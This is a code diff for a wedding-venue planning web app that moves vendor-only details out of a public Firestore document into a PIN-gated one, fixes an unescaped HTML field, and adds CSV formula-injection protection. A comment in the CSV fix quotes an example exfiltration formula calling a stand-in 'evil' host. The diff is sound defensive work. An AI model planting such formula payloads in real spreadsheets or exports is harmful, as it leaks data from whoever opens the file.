@@ -131,6 +131,10 @@
 
     let vendorSlotId_ = null, vendorCoupleSlug_ = null, vendorCategoryDef_ = null, vendorSlotLabel_ = null;
     let vendorPublicData = null, vendorSlotData = null, vendorCoupleUid_ = null, vendorTimelineItems = [];
+    // Fetched ONLY after PIN verification, from the PIN-gated
+    // couples/{uid}/vendorSharedData/venueInfo doc -- never from the
+    // world-public publicCouples mirror (see syncVendorVenueInfo).
+    let vendorGatedInfo = {};
 
     // ── VENDOR VIEW ROUTING ───────────────────────────────────────
     // Vendor links (planning.theseventyfivevenue.com/vendor/{slotId}) hit the same
@@ -893,7 +897,7 @@
       const grid = document.getElementById("resources-grid");
       if (!grid) return;
       if (!items.length) { grid.innerHTML = '<p style="grid-column:1/-1;text-align:center;color:var(--mid-gray);font-size:13px;padding:20px;">No resources have been added yet.</p>'; return; }
-      grid.innerHTML = items.map(r => `<a class="resource-card" href="${esc(r.linkUrl)}" target="_blank"><div class="resource-icon"></div><h3>${esc(r.title)}</h3><p>${r.description}</p><span class="resource-link">${esc(r.buttonLabel||"Learn More")}</span></a>`).join("");
+      grid.innerHTML = items.map(r => `<a class="resource-card" href="${esc(r.linkUrl)}" target="_blank"><div class="resource-icon"></div><h3>${esc(r.title)}</h3><p>${esc(r.description)}</p><span class="resource-link">${esc(r.buttonLabel||"Learn More")}</span></a>`).join("");
     }
     // ── VENDOR MEETINGS (PLANNING TOOL) ──────────────────────────
     let vendorMeetingsCache = [];
@@ -3368,25 +3372,35 @@
           itineraryItems: Array.isArray(data.itineraryItems) ? data.itineraryItems : [],
           thingsToDo: (Array.isArray(data.thingsToDo) && data.thingsToDo.length) ? data.thingsToDo : DEFAULT_THINGS_TO_DO,
           registryItems: Array.isArray(data.registryItems) ? data.registryItems : [],
-          registryLinks: Array.isArray(data.registryLinks) ? data.registryLinks : [],
-          // Vendor-portal fields: mirrored here (a publicly-readable doc) so a verified
-          // vendor's PIN-scoped session can read venue/POC info without needing broader
-          // read access to the couple's private couples/{uid} document.
+          registryLinks: Array.isArray(data.registryLinks) ? data.registryLinks : []
+          // Vendor-portal fields (lead coordinator, venue rental time, the
+          // full day-of timeline, guest count) do NOT live here -- this doc
+          // is world-readable with no auth at all (`publicCouples` allows
+          // `get: if true`, by design, for the unauthenticated guest RSVP
+          // page). They're synced to the PIN-gated
+          // couples/{uid}/vendorSharedData/venueInfo doc below instead, so
+          // they're never reachable without a vendor actually passing the
+          // PIN gate (or being the couple/admin).
+        });
+        await syncVendorVenueInfo(uid, data, guestList);
+      } catch(e) { console.error("Public profile sync failed:", e); }
+    }
+
+    // Companion to syncPublicProfile, writing the same vendor-only fields
+    // that used to live in the public mirror into a properly access-
+    // controlled doc instead. Called from inside syncPublicProfile so every
+    // existing call site (leadCoordinator save, venue rental time save,
+    // timeline save/delete, guest list save, etc.) picks this up for free.
+    async function syncVendorVenueInfo(uid, data, guestList) {
+      try {
+        await setDoc(doc(db, "couples", uid, "vendorSharedData", "venueInfo"), {
           leadCoordinator: data.leadCoordinator || { name: "", email: "", phone: "" },
           venueRentalEndTime: data.venueRentalEndTime || "",
           vendorArrivalWindow: data.vendorArrivalWindow || "",
-          // Mirrors the real Wedding Day Timeline (timelineItems[], edited only via the
-          // existing Timeline planning tool / admin editor) so the vendor portal's shared
-          // timeline always reflects the current data instead of a one-time copy.
           timelineItems: Array.isArray(data.timelineItems) ? data.timelineItems : [],
-          // Single live-linked headcount (attending guests + their allowed,
-          // named plus-ones) -- same formula the admin dashboard already
-          // uses. Just a number, not guest-specific detail, so every vendor
-          // category can read it (unlike the guestRoster doc below, which
-          // is restricted to Caterer/Bar + Photographer/Videographer).
           guestCount: guestList.reduce((sum, g) => g.rsvpStatus === "Attending" ? sum + 1 + (g.plusOneAllowed && g.plusOneName ? 1 : 0) : sum, 0)
         });
-      } catch(e) { console.error("Public profile sync failed:", e); }
+      } catch(e) { console.error("Vendor venue info sync failed:", e); }
     }
 
     window.saveField = async function(meeting, field, value) {
@@ -3885,7 +3899,13 @@
       return total > 0 ? Math.round((filled / total) * 100) : 0;
     }
 
-    function esc(s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); }
+    // Escapes &, <, >, ", and ' -- the ' matters wherever esc() output could
+    // ever land inside a single-quoted attribute or a single-quoted JS
+    // string literal (e.g. onclick="...('${esc(x)}')"). No current call site
+    // does that (ids/prefixes used in onclick args are always system-
+    // generated, never raw free text), but hardening this here closes off
+    // that whole class of injection for any future code that does.
+    function esc(s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;"); }
 
     window.openCouple = async function(uid) {
       const { getDoc: gd, doc: dc } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js");
@@ -5223,12 +5243,19 @@
         if (!slotSnap.exists()) throw new Error("Vendor tab not found.");
         vendorSlotData = slotSnap.data();
         vendorCoupleUid_ = vendorSlotData.coupleUid;
-        // Re-fetch (rather than trust the pre-auth copy from loadVendorGate) so venue
-        // info, POC, and the timeline are current as of right now, not page-load time.
+        // Re-fetch (rather than trust the pre-auth copy from loadVendorGate) so
+        // coupleNames/weddingDate are current as of right now, not page-load time.
         try {
           const freshPublic = await getDoc(doc(db, "publicCouples", vendorCoupleSlug_));
           if (freshPublic.exists()) vendorPublicData = freshPublic.data();
         } catch(e) {}
+        // Venue/POC/timeline/guest-count info only becomes readable now that
+        // we're authenticated with a verified vendor token -- it lives in the
+        // PIN-gated doc, never the public mirror.
+        try {
+          const gatedSnap = await getDoc(doc(db, "couples", vendorCoupleUid_, "vendorSharedData", "venueInfo"));
+          vendorGatedInfo = gatedSnap.exists() ? gatedSnap.data() : {};
+        } catch(e) { vendorGatedInfo = {}; }
         document.getElementById("vendor-gate").style.display = "none";
         document.getElementById("vendor-content").style.display = "block";
         await renderVendorSkeleton();
@@ -5250,11 +5277,11 @@
 
       document.getElementById("vendor-view-title").textContent = vendorSlotLabel_ + (vendorSlotData.vendorName ? " — " + vendorSlotData.vendorName : "");
 
-      const lc = (vendorPublicData && vendorPublicData.leadCoordinator) || {};
+      const lc = (vendorGatedInfo && vendorGatedInfo.leadCoordinator) || {};
       document.getElementById("vendor-venue-info").innerHTML = `
-        <div class="amd-row"><div class="amd-key">Guest Count</div><div class="amd-val">${(vendorPublicData && Number.isFinite(vendorPublicData.guestCount)) ? esc(String(vendorPublicData.guestCount)) : "Not yet set"} <span style="color:var(--mid-gray);font-size:11px;">(live-linked from Guest List/RSVP)</span></div></div>
-        <div class="amd-row"><div class="amd-key">Venue Rental Ends</div><div class="amd-val">${esc((vendorPublicData && vendorPublicData.venueRentalEndTime) || "Not yet set")}</div></div>
-        <div class="amd-row"><div class="amd-key">Vendor Arrival Window</div><div class="amd-val">${esc((vendorPublicData && vendorPublicData.vendorArrivalWindow) || "Not yet set")}</div></div>
+        <div class="amd-row"><div class="amd-key">Guest Count</div><div class="amd-val">${(vendorGatedInfo && Number.isFinite(vendorGatedInfo.guestCount)) ? esc(String(vendorGatedInfo.guestCount)) : "Not yet set"} <span style="color:var(--mid-gray);font-size:11px;">(live-linked from Guest List/RSVP)</span></div></div>
+        <div class="amd-row"><div class="amd-key">Venue Rental Ends</div><div class="amd-val">${esc((vendorGatedInfo && vendorGatedInfo.venueRentalEndTime) || "Not yet set")}</div></div>
+        <div class="amd-row"><div class="amd-key">Vendor Arrival Window</div><div class="amd-val">${esc((vendorGatedInfo && vendorGatedInfo.vendorArrivalWindow) || "Not yet set")}</div></div>
         <div class="amd-row"><div class="amd-key">Directions</div><div class="amd-val">${esc(venueInfo.directions || "10835 State Route 374, Rockbridge, Ohio 43149")}</div></div>
         <div class="amd-row"><div class="amd-key">Parking</div><div class="amd-val">${esc(venueInfo.parking || "Details coming soon.")}</div></div>
         <div class="amd-row"><div class="amd-key">Groom Suite / Vendor Space Policy</div><div class="amd-val">${esc(venueInfo.groomSuitePolicy || "Details coming soon.")}</div></div>`;
@@ -5373,7 +5400,7 @@
     async function loadVendorTimeline() {
       if (!vendorCoupleUid_) return;
       const notesById = await fetchTimelineNotesById(vendorCoupleUid_);
-      const baseItems = (vendorPublicData && vendorPublicData.timelineItems) || [];
+      const baseItems = (vendorGatedInfo && vendorGatedInfo.timelineItems) || [];
       vendorTimelineItems = mergeTimelineWithNotes(baseItems, notesById);
       renderVendorTimelineList();
     }
@@ -5418,9 +5445,21 @@
       return `${couple}_${cat}.${ext}`;
     }
 
+    // Neutralizes CSV/formula injection: a cell whose value starts with =, +,
+    // -, @, tab, or CR is interpreted as a formula by Excel/Sheets when the
+    // file is opened -- a vendor typing e.g. =HYPERLINK("http://evil/?"&A1)
+    // into a Notes field could otherwise exfiltrate data or run arbitrary
+    // formula logic the moment the couple/admin opens the exported CSV.
+    // Prefixing with a single quote forces spreadsheet apps to treat it as
+    // literal text while staying human-readable.
+    function csvSafeCell(value) {
+      const s = String(value);
+      return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+    }
+
     window.exportVendorCSV = function() {
       const rows = [["Field","Value"], ...vendorExportRows()];
-      const csv = rows.map(r => r.map(cell => `"${String(cell).replace(/"/g,'""')}"`).join(",")).join("\r\n");
+      const csv = rows.map(r => r.map(cell => `"${csvSafeCell(cell).replace(/"/g,'""')}"`).join(",")).join("\r\n");
       const blob = new Blob([csv], { type: "text/csv" });
       const a = document.createElement("a");
       a.href = URL.createObjectURL(blob);
@@ -5587,12 +5626,20 @@
         const floristSlots = allSlots.filter(e => e.slot.category === "florist");
         if (floristSlots.length) out.extraFlowersForDetailShots = floristSlots.some(e => !!(e.slot.responses||{}).extraFlowersForDetailShots);
       } catch(e) { console.error("Fetching vendor cross-refs failed:", e); }
+      // dinnerStyle only -- low-sensitivity (buffet vs. plated), already
+      // public pre-existing for guest RSVP meal selection, not a new
+      // exposure. venueRentalEndTime and guestCount come from the PIN-gated
+      // doc below instead, NOT this world-public one.
       try {
         const pub = await getDoc(doc(db, "publicCouples", coupleSlug));
-        if (pub.exists()) {
-          out.dinnerStyle = pub.data().dinnerStyle || "";
-          out.venueRentalEndTime = pub.data().venueRentalEndTime || "";
-          out.guestCount = Number.isFinite(pub.data().guestCount) ? pub.data().guestCount : null;
+        if (pub.exists()) out.dinnerStyle = pub.data().dinnerStyle || "";
+      } catch(e) {}
+      try {
+        const gatedSnap = await getDoc(doc(db, "couples", coupleUid, "vendorSharedData", "venueInfo"));
+        if (gatedSnap.exists()) {
+          const gd = gatedSnap.data();
+          out.venueRentalEndTime = gd.venueRentalEndTime || "";
+          out.guestCount = Number.isFinite(gd.guestCount) ? gd.guestCount : null;
         }
       } catch(e) {}
       try {
